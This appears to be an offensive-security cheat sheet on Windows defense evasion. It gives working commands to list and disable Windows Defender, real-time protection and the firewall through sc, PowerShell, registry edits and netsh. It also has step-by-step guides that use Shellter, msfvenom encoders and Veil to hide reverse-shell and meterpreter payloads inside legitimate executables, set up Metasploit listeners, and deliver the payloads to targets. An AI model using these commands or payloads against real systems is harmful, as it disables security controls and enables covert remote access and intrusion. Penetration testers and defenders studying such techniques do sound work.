# Defense Evasion

## Enumerate Defenses

***

### Enumerate Antivirus

To list installed antivirus products on the system.

```jsx
WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName
```

### Enumerate Firewall Configuration

To view the Windows Firewall configuration

```jsx
netsh advfirewall firewall dump
```

Alternatively, you can use:

```jsx
netsh firewall show state netsh firewall show config
```

### Enumerate Windows Defender Status

To check the status of Windows Defender

```jsx
PS C:\\\\> Get-MpComputerStatus
```

## Disable Windows Defenses

***

### Disable Windows Defender

To disable Windows Defender

```jsx
sc config WinDefend start= disabled sc stop WinDefend Set-MpPreference -DisableRealtimeMonitoring $true
```

To disable Windows Defender scans for downloaded and attachment files

```jsx
PS C:\\\\> Set-MpPreference -DisableRealtimeMonitoring $true Get-MpComputerStatus PS C:\\\\> Set-MpPreference -DisableIOAVProtection $true
```

### Disable Real-Time Protection

To disable real-time protection in Windows Defender

```jsx
reg delete "HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender" /f reg add "HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f reg add "HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

### Disable Windows Firewall

To disable Windows Firewall for all profiles

```jsx
Netsh Advfirewall show allprofiles NetSh Advfirewall set allprofiles state off
```

## Disable Antivirus

***

```jsx
reg delete "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /f
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

## Antivurs Evasion

***

### Dynamic Shellcode Injection with Shellter

***

Dynamic shellcode injection with Shellter is a technique used to inject shellcode into a Windows executable, allowing for covert execution of malicious code.

#### Install Shelter

Search for Shellter using `apt-cache`

```jsx
apt-cache search shellter
```

Install Shellter using `apt`

```jsx
sudo apt install shellter
```

Open a terminal and run Shellter

```jsx
shellter
```

#### Configure Shellter

1. In Shellter, choose "`Auto`" mode for automatic configuration.
2. Select an original PE (Portable Executable) file as the target for injection. Examples include executables like `winrar.exe` or `spotify.exe`.
3. Enable "`Stealth Mode`" for covert execution.
4. Choose a payload for your shellcode. For example, you can select

#### Configure Multi/Handler Listener

Open Metasploit

```jsx
msfconsole
```

Use the multi/handler module

```jsx
use multi/handler
```

Set the payload to match the one selected in Shellter:

```jsx
set payload windows/meterpreter/reverse_tcp
```

Set the `LHOST` and `LPORT` to match your listener's IP address and port:

```jsx
set LHOST <your_IP> set LPORT <your_port>
```

Optionally, you can set an AutoRunScript to migrate to another process post-exploitation

```jsx
set AutoRunScript post/windows/manage/migrate
```

Start the Metasploit listener

```jsx
run
```

#### Transfer Payload to Target

Transfer the executable (with injected shellcode) to the target system using a secure method. Ensure that the target has the necessary permissions to execute the file.

#### Execute Payload

On the target system, execute the payload

```jsx
[path_to_executable]/[executable_name].exe
```

The payload will attempt to establish a connection back to your Metasploit listener, providing you with a meterpreter shell.

### AV Evasion with MSFvenom (PE Injection)

***

To perform PE injection with MSFvenom, follow these steps:

Generate a payload using MSFvenom. For example, we'll create a reverse shell payload with the `windows/shell_reverse_tcp` payload, set the listening host and port (`LHOST` and `LPORT`), specify the format as `exe`, choose an encoder (`x86/shikata_ga_nai`), set the number of iterations (`i`), select the target executable to inject into (`x`), and specify the output file (`o`).

```jsx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.4 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -x /usr/share/windows-resources/binaries/plink.exe -o ishell.exe
```

This command generates an executable (`ishell.exe`) with the injected payload. You can also generate the payload directly from the `msfconsole`. Start `msfconsole` and use the following commands.

```jsx
generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

This command generates the executable (`shell_reverse_msf_encoded_embedded.exe`) with the encoded payload.

### AV Evasion with Veil

***

Veil is a popular tool used for AV (Antivirus) evasion by generating payloads with various techniques to bypass antivirus detection. Here's a step-by-step guide on using Veil for AV evasion:

Start Veil

```jsx
veil
```

**Activate Veil**

```jsx
use 1
```

Veil provides a list of evasion methods and payloads. In this case, we're using option 1.

Check Available Payloads. To see a list of available payloads, use:

```jsx
list
```

Select a Payload. \*\*\*\*Choose a payload by its number. For example, to select payload 22, use:

```jsx
Use 22
```

Change Your LHOST Variable. The `LHOST` variable represents the IP address of your listener (Metasploit or other C2). Update it according to your setup.

Generate the Payload and Specify a File Name. Use the `generate` command to generate the payload. Veil will ask for a file name; you can specify one.

```jsx
generate
```

Transfer Payload to the Targe**t.** Transfer the generated payload to the target system through a secure method (e.g., SCP, SMB, or HTTP).

Set Up a Multi/Handler Listener\*\*.\*\* In Metasploit, you can set up a multi/handler listener to receive the incoming connections from the payload. Configure it with the appropriate payload and options.

```jsx
use multi/handler set payload windows/meterpreter/reverse_tcp set AutoRunScript post/windows/manage/migrate
```

Execute the Payload on the Target. \*\*\*\*Execute the payload on the target system. When the payload connects back to the handler, you will gain access to the target.

***

### AV Evasion with MSFvenom Encoders

***

MSFvenom, a part of Metasploit, provides a versatile way to generate payloads with different encoders for AV evasion. Here are steps to create payloads with MSFvenom and its encoders:

Generate a Payload with an Encoder. Use MSFvenom to generate a payload with a specific encoder. In this example, we use the `x86/shikata_ga_nai` encoder for AV evasion. Specify your `LHOST` and `LPORT` as needed.

```jsx
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.222.128 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o software.exe
```

You can experiment with different encoders to find one that is not detectable by antivirus software. Use the `--list encoders` option to see the available encoders:

```jsx
msfvenom --list encoders
```

Transfer the generated payload to the target system and execute it. When the payload connects back to your listener, you will gain access to the target.
